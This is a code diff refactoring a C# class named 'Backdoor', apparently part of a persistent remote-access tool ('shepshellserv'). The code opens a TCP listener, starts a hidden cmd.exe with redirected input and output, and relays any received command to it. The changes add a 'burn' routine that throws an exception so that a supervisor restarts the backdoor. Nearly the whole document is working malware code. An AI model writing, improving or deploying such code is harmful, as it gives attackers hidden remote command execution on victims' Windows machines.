@@ -10,10 +10,10 @@ namespace shepshellserv
     public class Backdoor
     {
         private TcpListener listener;
-        private Socket mainSocket;
+        private Socket socket;
         private Process shell;
-        private StreamReader fromShell;
-        private StreamWriter toShell;
+        private StreamReader reader;
+        private StreamWriter writer;
         private StreamReader inStream;
         private StreamWriter outStream;
         private Thread shellThread;
@@ -35,38 +35,46 @@ namespace shepshellserv
                 {
                     listener = new TcpListener(port);
                     listener.Start();
-                    mainSocket = listener.AcceptSocket();
+                    socket = listener.AcceptSocket();
                 }
                 catch (Exception) {  }
 
-                Stream s = new NetworkStream(mainSocket);
+                Stream s = new NetworkStream(socket);
                 inStream = new StreamReader(s);
                 outStream = new StreamWriter(s);
                 outStream.AutoFlush = true;
 
-                shell = new Process();
-                shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                ProcessStartInfo p = new ProcessStartInfo("cmd");
-                p.WindowStyle = ProcessWindowStyle.Hidden;
-                p.CreateNoWindow = true;
-                p.UseShellExecute = false;
-                p.RedirectStandardError = true;
-                p.RedirectStandardInput = true;
-                p.RedirectStandardOutput = true;
-                shell.StartInfo = p;
-                shell.Start();
-                toShell = shell.StandardInput;
-                fromShell = shell.StandardOutput;
-                toShell.AutoFlush = true;
+                startCMD();
+                writer = shell.StandardInput;
+                reader = shell.StandardOutput;
+                writer.AutoFlush = true;
+
                 shellThread = new Thread(new ThreadStart(getShellInput));
                 shellThread.Start();
+
                 getInput();
-                dropConnection();
+                burn();
 
             }
-            catch (Exception) { dropConnection(); }
+            catch (Exception) { burn(); }
         }
 
+        void startCMD()
+        {
+            shell = new Process();
+            shell.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+            ProcessStartInfo p = new ProcessStartInfo("cmd");
+            p.WindowStyle = ProcessWindowStyle.Hidden;
+            p.CreateNoWindow = true;
+            p.UseShellExecute = false;
+            p.RedirectStandardError = true;
+            p.RedirectStandardInput = true;
+            p.RedirectStandardOutput = true;
+            shell.StartInfo = p;
+
+            shell.Start();
+        }
         void getShellInput()
         {
             try
@@ -74,11 +82,11 @@ namespace shepshellserv
 
                 String tempBuf = "";
                 outStream.WriteLine("\r\n");
-                while ((tempBuf = fromShell.ReadLine()) != null)
+                while ((tempBuf = reader.ReadLine()) != null)
                 {
                     outStream.WriteLine(tempBuf + "\r");
                 }
-                dropConnection();
+                burn();
             }
             catch (Exception) { }
         }
@@ -97,17 +105,16 @@ namespace shepshellserv
             catch (Exception) { }
         }
 
-        private void handleCommand(String com)
+        private void handleCommand(String input)
         {
             try
             {
 
-                if (com.Equals("quit"))
+                if (input.Equals("quit"))
                 {
-                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
-                    dropConnection();
+                    burn();
                 }
-                else if (com.Equals("help"))
+                else if (input.Equals("help"))
                 {
                     outStream.WriteLine(@"
  _____   _   _   _____  ______    ___   ______  ______   _   _____       ______   _____   _   _  ______ 
@@ -118,41 +125,36 @@ namespace shepshellserv
 \____/  \_| |_/ \____/  \_|     \_| |_/ \_| \_| |___/       \____/       \____/   \___/  \_| \_/ |___/  
                                   
 % D3ADZO % 
-
 Use this bind shell to execute any Windows commands. 
 Sending the command <help> will bring this up again.
 ");
-                    toShell.WriteLine("EOFX\r\n");
+                    writer.WriteLine("EOFX\r\n");
                 }
                 else
                 {
-                    toShell.WriteLine(com + "\r\n");
-                    toShell.WriteLine("EOFX\r\n");
+                    writer.WriteLine(input + "\r\n");
+                    writer.WriteLine("EOFX\r\n");
                 }
                 
             }
-            catch (Exception) { dropConnection(); }
+            catch (Exception) { burn(); }
         }
 
 
-        private void dropConnection()
+        private void burn()
         {
-            try
-            {
-                shell.Close();
-                shell.Dispose();
-                //shellThread.Abort();
-                shellThread = null;
-                inStream.Dispose();
-                outStream.Dispose();
-                toShell.Dispose();
-                fromShell.Dispose();
-                shell.Dispose();
-                mainSocket.Close();
-                listener.Stop();
-                return;
-            }
-            catch (Exception) { }
+            shell.Close();
+            shell.Dispose();
+            shellThread = null;
+            inStream.Dispose();
+            outStream.Dispose();
+            writer.Dispose();
+            reader.Dispose();
+            shell.Dispose();
+            socket.Close();
+            listener.Stop();
+            
+            throw new Exception(); //shepard restarts on error out
         }
 
     }
